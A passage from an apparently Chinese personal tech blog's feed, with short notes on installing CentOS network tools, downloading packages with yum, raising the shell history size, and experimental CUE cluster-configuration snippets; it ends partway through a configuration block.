    <content type="html"><![CDATA[<table><thead><tr><th align="left"></th><th align="left">centos</th><th align="left">ubuntu</th></tr></thead><tbody><tr><td align="left">dig nslookup</td><td align="left">yum install -y bind-utils</td><td align="left"></td></tr><tr><td align="left">telnet</td><td align="left">yum install -y telnet</td><td align="left"></td></tr><tr><td align="left"><font face="??, Bookerly, 霞鹜文楷 GB, LXGW WenKai, Segoe UI Emoji, ??, ??, ??, Inter, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Microsoft YaHei, sans-serif"><span style="letter-spacing: 0.45px;">ifconfig route arp netstat</span></font><br></td><td align="left"><font face="??, Bookerly, 霞鹜文楷 GB, LXGW WenKai, Segoe UI Emoji, ??, ??, ??, Inter, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Microsoft YaHei, sans-serif"><span style="letter-spacing: 0.45px;">net-tools</span></font><br></td><td align="left"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202306)常用命令：yum</title>
    <link href="/2023/06/15/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Ayum/"/>
    <url>/2023/06/15/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Ayum/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum clean all<br>yum makecache<br>yum list --showduplicates  | grep libseccomp<br>yum install --downloadonly --downloaddir . libseccomp<br>yum install --downloadonly --downloaddir . libseccomp*<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp</span><br>Last metadata expiration check: 0:01:35 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                           Architecture                   Version                                      Repository                                    Size<br>==================================================================================================================================================================<br>Upgrading:<br> libseccomp                        aarch64                        2.5.2-1.0.4.uelc20.01                        UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Upgrade  1 Package<br><br>Total download size: 69 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: N<br>Operation aborted.<br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp*</span><br>Last metadata expiration check: 0:01:46 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                               Architecture                Version                                     Repository                                    Size<br>==================================================================================================================================================================<br>Installing:<br> libseccomp-devel                      aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-AppStream                      56 k<br> libseccomp-static                     aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-Plus                           67 k<br>Upgrading:<br> libseccomp                            aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Install  2 Packages<br>Upgrade  1 Package<br><br>Total download size: 192 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: y<br>Downloading Packages:<br>(1/3): libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                                34 MB/s |  69 kB     00:00    <br>(2/3): libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                         3.1 MB/s |  56 kB     00:00    <br>(3/3): libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                        286 kB/s |  67 kB     00:00    <br>------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>Total                                                                                                                             822 kB/s | 192 kB     00:00     <br>Complete!<br>The downloaded packages were saved <span class="hljs-keyword">in</span> cache until the next successful transaction.<br>You can remove cached packages by executing <span class="hljs-string">&#x27;yum clean packages&#x27;</span>.<br><br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># ll</span><br>total 200<br>-rw-r----- 1 root root 71080 Jun 15 14:23 libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 57748 Jun 15 14:23 libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 68128 Jun 15 14:23 libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202306) 修改history条数</title>
    <link href="/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%20%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/"/>
    <url>/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%20%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo $HISTSIZE</span><br>5<br><span class="hljs-comment"># sed -i &#x27;s/^HISTSIZE=5/HISTSIZE=200/&#x27; /etc/profile</span><br><span class="hljs-comment"># source /etc/profile  </span><br><span class="hljs-comment"># echo $HISTSIZE</span><br>200<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202306)修改history条数</title>
    <link href="/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/"/>
    <url>/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo $HISTSIZE</span><br>5<br><span class="hljs-comment"># sed -i &#x27;s/^HISTSIZE=5/HISTSIZE=200/&#x27; /etc/profile</span><br><span class="hljs-comment"># source /etc/profile  </span><br><span class="hljs-comment"># echo $HISTSIZE</span><br>200<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue】test2</title>
    <link href="/2023/06/07/cue/unsupported/%E3%80%90cue%E3%80%91test2/"/>
    <url>/2023/06/07/cue/unsupported/%E3%80%90cue%E3%80%91test2/</url>
    
    <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> SelfNodeVariable.regionImageRegistryResolution &#123;<br>       <br>       &#123;<br>           data: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">           test3.host</span><br><span class="hljs-string">           &quot;&quot;&quot;</span><br>           mode: <span class="hljs-string">&quot;0755&quot;</span><br>           path: <span class="hljs-string">&quot;test&quot;</span><br>       &#125;<br>     &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【go语言系列】数组 切片 map</title>
    <link href="/2023/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E6%95%B0%E7%BB%84%20%E5%88%87%E7%89%87%20map/"/>
    <url>/2023/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E6%95%B0%E7%BB%84%20%E5%88%87%E7%89%87%20map/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue】test</title>
    <link href="/2023/05/18/cue/%E3%80%90cue%E3%80%91test/"/>
    <url>/2023/05/18/cue/%E3%80%90cue%E3%80%91test/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">NodeConfs: &#123;<br>  master: &#123;<br>    services: &#123;<br>        abcd: &#123;<br>            endpoints: [<br>              &#123;<br>                dns: [<span class="hljs-string">&quot;\(node.name)&quot;</span>]<br>                name: <span class="hljs-string">&quot;test&quot;</span><br>                protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>                ports: <span class="hljs-string">&quot;1234&quot;</span><br>              &#125;<br>            ]<br>        &#125;<br>    &#125;<br>  &#125;<br>  <br>&#125;<br><br><br><br><br>cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongo :<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongoA : &#123;<br>                 <br>                <br>                &#125;<br>                mognoB: &#123;<br>                <br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1111&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2222&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1112&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2223&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>            &#125;,<br>        ]<br>    &#125;   <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: [<br>                      &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;,&#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                  ]<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>                services: &#123;<br>                    mongo : &#123;<br>                      endpoints: &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                  